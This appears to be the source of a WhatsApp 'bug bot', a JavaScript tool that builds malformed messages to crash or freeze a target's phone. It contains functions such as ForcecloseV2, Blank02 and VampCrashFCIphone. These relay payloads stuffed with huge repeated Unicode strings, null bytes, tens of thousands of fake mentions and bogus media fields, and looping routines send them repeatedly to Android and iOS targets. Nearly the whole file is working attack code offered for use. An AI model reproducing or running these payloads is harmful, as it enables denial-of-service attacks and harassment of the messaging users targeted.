          directPath: `/v/t62.43144-24/${encMedia}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0`,
          fileLength: {
            low: Math.floor(Math.random() * 800),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1900000000),
            high: 0,
            unsigned: false
          },
          isAnimated: true,
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -10000000),
            high: 100,
            unsigned: flag
          },
          isAvatar: flag,
          isAiSticker: flag,
          isLottie: flag
        }
      }
    }
  }

  const msgObj = generateWAMessageFromContent(target, content, {})

  await zaree.relayMessage("status@broadcast", msgObj.message, {
    messageId: msgObj.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  })
}

async function gabuts(zaree, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "MORTALGANTENG",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "꧀ꦽꦾ".repeat(50000), 
                address: "ꦽꦽ".repeat(20000),
              },
            },
            body: {
              text: "ILOVEYOU" + "ꦽ".repeat(9999),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

      await zaree.relayMessage("status@broadcast", message, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.log(err);
  }
console.log(chalk.yellow("Whoopsx Success Sending Fc Bugs"));
}

async function zareeForcer(target) {
    for (let i = 0; i <= 5; i++) {
    await CardsSqL(target)
    await langitfc(target)
    await gabuts(zaree, target)
    await CardsSqL(target)
    await langitfc(target)
    await gabuts(zaree, target)
    
    
    }

}

async function ForcecloseV2(zaree, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "\u2060",
              address: "\u0000\u200E\u202E\u2060\u200B".repeat(20000)
            },
            hasMediaAttachment: false
          },
          body: {
            text: "🩸 zaree - Junior 🔪",
            format: "DEFAULT"
          },
          footer: {
            text: "\u0007".repeat(3000)
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: Array.from({ length: 20 }, (_, i) => ({
              name: "btn_" + i,
              buttonParamsJson: "\u0000\u200B\u202E".repeat(6000)
            }))
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 88888 }, () =>
              Math.floor(Math.random() * 1e16).toString() + "@s.whatsapp.net"
            ),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "💀",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        screen_0_TextInput_0: "\u0000".repeat(500000)
                      })
                    }
                  }
                }
              }
            }
          }
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/FAKE_DEAD_URL_MUTATED.mp4?fail=true",
          mimetype: "video/mp4",
          fileSha256: Buffer.alloc(32),     
          fileLength: "9999999999",
          seconds: 999999,
          mediaKey: Buffer.alloc(32),             
          height: 9999,
          width: 9999,
          fileEncSha256: Buffer.alloc(32),
          directPath: "/v/t62/invalid/fail/null_" + "\u202E".repeat(2000),
          mediaKeyTimestamp: "9999999999",
          jpegThumbnail: "",
          streamingSidecar: Buffer.alloc(3000).toString("base64")
        }
      }
    }
  };

  await zaree.relayMessage(target, msg, {});
  console.log(`✅ ForcecloseV2 terkirim ke ${target}`);
}

async function galaxy_invisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Hama", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@rizxvelzinfinity${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await zaree.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

//FUNC BLANK
async function Blank02(target, amount) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "+ zaree Blank",
              hasMediaAttachment: false,
            },
            body: {
              text: "• Blank‌",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ allowCall: true }),
                },
              ],
            },
          },
          interactiveResponseMessage: {
            body: {
              text: "",
              format: "DEFAULT",
            },
            nativeFlowMesssage: {
              name: "call_permission_request",
              messagePramjson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );

  for (let i = 0; i < amount; i++) {
    await zaree.relayMessage(target, msg.message, {
      messageId: msg.key.id,
    });
  }
}

async function VampUiBlank(target, Ptcp) {
      await zaree.relayMessage(target, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Whoopsx.zip",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🩸𝗠𝗼𝗿𝘁𝗮𝗹 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂🔪\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'zaree', url: \"https://wa.me//6282335900630\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Whoopsx.doc",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
      console.log(chalk.yellow("Whoopsx Success Sending Bug"));
    }

async function BlankKipop(target) {
  const One = "\u2026\u0003\u202E\u200F".repeat(3500);
  const Two = "꧈".repeat(4000);
  const Three = "​ꦽꦽꦽ".repeat(5000);

  const paramsTemplate = {
    screen_2_OptIn_0: true,
    screen_2_OptIn_1: true,
    screen_1_Dropdown_0: "Core Bug",
    screen_1_DatePicker_1: Date.now() + 1000,
    screen_1_TextInput_2: "RowN.RowN@RowN.RowN@xnxx.RowN.RowN@RowN.RowN@xnxx.col",
    screen_1_TextInput_3: "94643116",
    screen_0_TextInput_0: "radio - buttons" + "\u0000".repeat(10000),
    screen_0_TextInput_1: "Anjay",
    screen_0_Dropdown_2: "Win      -     Ez",
    screen_0_RadioButtonsGroup_3: "0_true",
    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
  };

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          nativeFlowMessage: {
            name: "flow_message",
            params: paramsTemplate
          },
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
              mimeType: "image/webp",
              mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
              sourceUrl: "https://t.me/zaree61",
              title: "Remove All Blank",
              mediaType: 1,
              mediaKeyTimestamp: "13158969_599169879950168_4005798415047356712_n",
              jpegThumbnail: Buffer.from("")
            }
          },
          body: {
            text: "Blank Remove" + One + Two + Three
          },
          message: {
            buttonsMessage: {
              text: "🩲".repeat(3500),
              contentText: "Remove Blank",
              footerText: "@zareerash",
              buttons: [
                {
                  buttonId: "ꦽ" + "\u0003".repeat(350000),
                  buttonText: { displayText: "Here Stt" },
                  type: 1
                }
              ],
              headerType: 1,
              viewOnce: false
            }
          }
        }
      }
    }
  }, {});

  await zaree.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

//BLANK IOS
async function VampCrashFCIphone(target) {
  const crashText = "Whoopsx Crash Telah Datang... ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  const message = {
    text: crashText,
    contextInfo: {
      externalAdReply: {
        title: "Mortal.zip",
        body: `\u0000`,
        previewType: "PHOTO",
        thumbnail: "",
        sourceUrl: "https://t.me/infomortal2"
      }
    }
  };

  await zaree.sendMessage(target, message, { quoted: null });
  console.log(chalk.blue("Whoopsx Success Crash Ios Bug"));
}

async function Blank(target) {
zaree.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Kasian hp baru kena blank" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
console.log(chalk.red("Whoopsx Success Blank Bug"));
}

async function zareeIos(target) {
    for (let i = 0; i <= 5; i++) {
    await VampCrashFCIphone(target)
    await Blank(target)
    await VampCrashFCIphone(target)
    await Blank(target)
    await VampCrashFCIphone(target)
    await Blank(target)
    await VampCrashFCIphone(target)
    }

}
    
// --- Jalankan Bot ---
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();